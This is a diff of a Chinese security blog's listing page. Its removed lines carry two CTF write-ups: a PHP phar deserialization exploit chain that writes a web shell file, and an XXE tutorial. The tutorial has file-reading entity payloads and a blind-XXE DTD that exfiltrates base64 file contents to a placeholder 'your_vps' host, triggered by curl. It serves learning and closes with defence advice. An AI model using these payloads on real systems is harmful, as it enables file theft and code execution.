-}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p>
-<h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p>
-<p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p>
-<h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p>
-<pre><code>&lt;?php
-namespace Illuminate\Broadcasting{
-    class PendingBroadcast{
-        function __construct(){
-            $this-&gt;events = new \Faker\ValidGenerator();
-            $this-&gt;event = &#39;everything&#39;;
-        }
-    }
-}
-
-namespace PHPUnit\Framework\MockObject\Invocation{
-    class StaticInvocation{
-        function __construct(){
-            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);
-        }
-    }
-}
-
-namespace PHPUnit\Framework\MockObject\Stub{
-    class ReturnCallback{
-        function __construct(){
-            $this-&gt;callback = &#39;file_put_contents&#39;;
-        }
-    }
-}
-
-namespace Faker{
-    class ValidGenerator{
-        function __construct(){
-            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();
-            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));
-            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));
-
-            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();
-
-            $this-&gt;validator = array($rc, &quot;invoke&quot;);
-            $this-&gt;generator = $g2;
-            $this-&gt;maxRetries = 10000;
-        }
-    }
-
-    class Generator{
-        function __construct($form){
-            $this-&gt;formatters = $form;
-        }
-    }
-
-}
-namespace{
-    $exp = new Illuminate\Broadcasting\PendingBroadcast();
-    print_r(urlencode(serialize($exp)));
-
-    // phar
-    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);
-    $p-&gt;startBuffering();
-    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
-    $p-&gt;setMetadata($exp);
-    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);
-    $p-&gt;stopBuffering();
-}</code></pre><p>上传文件，接着进行反序列化</p>
-<pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p>
-<p>再次膜前辈师傅们</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
-                    从两道CTF题目学习XXE漏洞 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-01-07   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
-<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
-<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
-<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
-<ul>
-<li>内置实体 (Built-in entities)</li>
-<li>字符实体 (Character entities)</li>
-<li>通用实体 (General entities)</li>
-<li>参数实体 (Parameter entities)</li>
-</ul>
-<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
-<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
-<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
-<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
-<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
-<p>关于外部实体引用file协议的例子如下：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
-&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
-或者
-&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE a [
-    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    %name;
-]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
-<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
-<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
-<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
-<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
-<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
-<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
-<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
-<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
-<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
-<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
-<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
-<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
-<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
-<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
-<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
-<pre><code>&lt;?php
-  function __autoload($cls) {
-    include $cls;
-  }
-
-  class Black {
-    public function __construct($string, $default, $keyword, $store) {
-      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
-      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
-      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);
-
-      if ($store) {
-            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
-      }
-    }
-  }
-
-  class Green {
-    public function __construct($string, $default, $keyword, $store) {
-      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
-      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
-      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);
-
-      if ($store) {
-            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
-      }
-    }
-  }
-
-  if ($_=@$_GET[&#39;theme&#39;]) {
-    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
-      if (@class_exists($_)) {
-        ($string = @$_GET[&#39;string&#39;]) || $string = false;
-        ($default = @$_GET[&#39;default&#39;]) || $default = false;
-        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;
-
-        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
-      }
-    }
-  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
-    $args = explode(&#39;-&#39;, $_);
-    if (class_exists($args[0])) {
-      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
-    }
-  } else if ($_=@$_GET[&#39;info&#39;]) {
-    phpinfo();
-  }
-
-  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
-<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
-<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
-<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
-<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
-<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
-<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
-<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-
-&lt;!DOCTYPE ANY[
-
-&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
-&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;
-
-%send;
-]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
-<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-
-&lt;!DOCTYPE ANY[
-
-&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;
-
-%send;
-%test;
-%back;
-]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
-<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
-
-&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
-<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
-<p>其中：</p>
-<ul>
-<li>外部实体send引入外部DTD声明</li>
-<li>参数实体test即为“中间参数实体”</li>
-<li>&#37;为了避免编码问题</li>
-<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
-</ul>
-<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
-<ol>
-<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
-</li>
-<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
-</li>
-</ol>
-<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
-<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
-<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
-<p>漏洞点就在后端解析xml。</p>
-<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
-<p>在挖掘漏洞的时候尤其注意两点：</p>
-<ol>
-<li>content-type: application/xml</li>
-<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
-</ol>
-<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
-<li><p>对于PHP，禁止引用外部实体</p>
-<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
-<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
-</li>
-</ol>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1595,7 +1447,7 @@ namespace{
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
   </nav>
 
     </main>
